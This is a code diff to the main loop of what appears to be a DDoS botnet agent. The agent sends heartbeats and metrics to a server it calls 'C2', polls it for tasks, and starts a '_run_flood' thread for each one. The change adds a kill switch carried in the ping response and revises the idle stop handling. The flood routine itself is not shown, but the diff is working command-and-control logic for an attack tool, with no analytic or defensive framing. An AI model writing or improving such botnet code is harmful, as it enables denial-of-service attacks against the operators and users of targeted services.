@@ -327,10 +327,15 @@ def main():
             # Heartbeat + send live metrics snapshot
             with _metrics_lock:
                 snap = dict(_metrics)
-            _post("/api/agent/ping", {
+            ping_resp = _post("/api/agent/ping", {
                 "id":      AGENT_ID,
                 "metrics": snap,
             })
+
+            # Kill switch: C2 can signal stop via ping response (works even while busy)
+            if ping_resp.get("stop") and _BUSY.is_set():
+                _STOP.set()
+                print("[agent] Kill switch received via ping — stopping flood")
 
             # Poll for task only if not busy
             if not _BUSY.is_set():
@@ -340,9 +345,10 @@ def main():
                     print("[agent] Received task: {}".format(task.get("task_id")))
                     t = threading.Thread(target=_run_flood, args=(task,), daemon=True)
                     t.start()
-                elif r.get("stop") and _BUSY.is_set():
+                elif r.get("stop"):
+                    # Stop flag set before task even started — clear any queued task
                     _STOP.set()
-                    print("[agent] Stop command received")
+                    print("[agent] Stop signal received (idle)")
 
         except Exception as exc:
             print("[agent] Poll error: {}".format(exc))
